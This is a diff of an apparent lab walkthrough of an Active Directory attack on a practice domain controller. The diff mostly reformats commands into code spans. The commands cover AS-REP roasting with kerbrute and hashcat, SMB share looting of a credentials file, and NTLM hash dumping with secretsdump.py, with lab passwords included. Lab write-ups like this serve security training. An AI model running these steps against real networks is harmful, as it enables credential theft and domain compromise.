@@ -30,17 +30,17 @@ Machine IP — 10.10.45.156&#x20;
 
 > To install the Python requirements for Impacket:
 
-> Command — pip3 install -r /opt/impacket/requirements.txt
+> `Command — pip3 install -r /opt/impacket/requirements.txt`
 
 > Once the requirements have finished installing, we can then run the python setup install script:
 
-> Command — cd /opt/impacket/ && python3 ./setup.py install
+> `Command — cd /opt/impacket/ && python3 ./setup.py install`
 
 After that, Impacket should be correctly installed now and it should be ready to use!&#x20;
 
 &#x20;**Installing Bloodhound and Neo4j**
 
-> Command — apt install bloodhound neo4j
+> `Command — apt install bloodhound neo4j`
 
 \====================================================================
 
@@ -50,7 +50,7 @@ After that, Impacket should be correctly installed now and it should be ready to
 
 We first undertake a version scan on the target, on ports 135,139, and 445 to find versions and other information
 
-> Command — nmap -sV -p 135,139,445 10.10.45.156
+> `Command — nmap -sV -p 135,139,445 10.10.45.156`
 
 We get the following information from the scan report:-
 
@@ -66,7 +66,7 @@ Keep in mind that enum4linux is not OS-specific. You can use it to enumerate SMB
 
 We use it to enumerate the host:-
 
-> Command — enum4linux 10.10.45.156
+> `Command — enum4linux 10.10.45.156`
 
 This is the information that we get:-
 
@@ -111,7 +111,7 @@ Steps to install Kerbrute properly:-
 
 Now to make use of the tool
 
-> Command — ./kerbrute userenum — dc 10.10.132.240 -d spookysec.local /home/kali/Downloads/Passwords
+> `Command — ./kerbrute userenum — dc 10.10.132.240 -d spookysec.local /home/kali/Downloads/Passwords`
 
 We get the following accounts:-
 
@@ -151,7 +151,9 @@ We get the password hash of the svc-admin user​
 
 Now, let's use Hashcat to decrypt it:-
 
-Command — hashcat -m 18200 Password Password 18200 = Kerberos 5,etype 23,AS-REP
+`Command — hashcat -m 18200 Password Password`&#x20;
+
+where 18200  = Kerberos 5,etype 23,AS-REP
 
 Cracked Password — management2005
 
@@ -189,7 +191,7 @@ Now, we try to see what shares are present on SMB, with svc-admin’s credential
 
 Now to access shares that we can:-
 
-> Command — smbclient //10.10.50.196/backup/ -U “svc-admin”
+> `Command — smbclient //10.10.50.196/backup/ -U “svc-admin”`
 
 ​Inside which we find:-​
 
@@ -197,13 +199,13 @@ Now to access shares that we can:-
 
 Now to download them onto the system, use the following commands:-
 
-> tarmode
+> `tarmode`
 
-> recurse
+> `recurse`
 
-> prompt
+> `prompt`
 
-> mget backup\_credentials.txt /home/kali/Downloads
+> `mget backup_credentials.txt /home/kali/Downloads`
 
 ![Questions:-](https://cdn-images-1.medium.com/max/1000/1\*JvgPTY4rwCYV6UNctUVzJQ.png)
 
@@ -229,7 +231,7 @@ Inserting the hash on Crackstation, gave us no dice, so we proceed to crack it w
 
 Then I tried inserting two equal to signs (==)towards the end of the hash, mimicking a base64 hash, and then tried to decode it
 
-> Command — base64 — decode SMB >> SMB1
+> `Command — base64 — decode SMB >> SMB1`
 
 Catting out the contents of SMB2, we find:-
 
@@ -253,7 +255,7 @@ Catting out the contents of SMB2, we find:-
 
 Now, let’s recover the NTLM hashes of accounts on the Domain Controller, using the secretsdump.py module.
 
-> Command — python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.50.156
+> `Command — python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.50.156`
 
 ​​![](https://cdn-images-1.medium.com/max/1000/1\*w75hGQS12klo0brSr1hThg.png)
 
